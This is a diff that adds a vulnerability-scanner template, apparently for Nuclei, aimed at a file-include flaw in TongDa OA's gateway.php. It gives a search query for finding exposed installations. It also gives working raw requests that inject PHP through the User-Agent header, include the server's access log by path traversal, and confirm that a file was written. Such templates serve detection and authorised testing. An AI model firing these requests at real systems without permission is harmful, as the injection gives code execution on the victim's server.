@@ -1,0 +1,34 @@
+id: tongda-oa-gateway-file-include
+
+info:
+  name: TongDa OA gateway.php File Include
+  author: zp857
+  severity: critical
+  tags: tongda-oa,lfi
+  metadata:
+    fofa-query: 'body="Anywhere 2017版" || body="/static/templates/2017_01/" || body="请联系OA软件开发商" || body="tongda" || body="通达"'
+
+requests:
+  - raw:
+      - |
+        POST /mac/gateway.php HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: 6666<?php fputs(fopen('qianxin.txt','w'),'qianxinnb');?>
+        Content-Type: application/x-www-form-urlencoded
+
+        json={"url":"/general/../../nginx/logs/oa.access.log"}
+
+      - |
+        GET /mac/qianxin.txt HTTP/1.1
+        Host: {{Hostname}}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+
+      - type: word
+        words:
+          - "share_id"
+          - "qianxinnb"
